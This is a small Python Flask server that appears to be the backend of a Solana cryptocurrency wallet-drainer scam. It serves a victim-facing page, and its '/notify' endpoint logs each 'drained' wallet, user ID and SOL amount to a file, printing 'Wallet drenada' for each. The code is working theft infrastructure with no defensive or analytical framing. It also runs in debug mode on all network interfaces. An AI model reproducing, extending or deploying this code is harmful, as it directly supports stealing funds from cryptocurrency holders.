from flask import Flask, request, jsonify, render_template
import json
from datetime import datetime
import os

app = Flask(__name__)

@app.route('/')
def index():
    user_id = request.args.get('user_id', 'unknown')
    amount = request.args.get('amount', '0')
    return render_template('index.html', user_id=user_id, amount=amount)

@app.route('/notify', methods=['POST'])
def notify():
    data = request.get_json()
    if not data or 'wallet' not in data:
        return jsonify({'status': 'error', 'message': 'Missing wallet'}), 400

    wallet = data['wallet']
    user_id = data.get('user_id', 'unknown')
    amount = data.get('amount', 0)
    timestamp = datetime.now().isoformat()

    with open('drained_wallets.json', 'a') as f:
        json.dump({
            'wallet': wallet,
            'user_id': user_id,
            'amount': amount,
            'timestamp': timestamp,
            'status': 'drained'
        }, f)
        f.write('\n')

    print(f"🔥 Wallet drenada: {wallet} (usuario: {user_id}) - {amount} SOL")
    return jsonify({'status': 'success'}), 200

@app.route('/health')
def health():
    return jsonify({'status': 'ok'}), 200

if __name__ == '__main__':
    if not os.path.exists('templates'):
        os.makedirs('templates')
    app.run(host='0.0.0.0', port=5001, debug=True)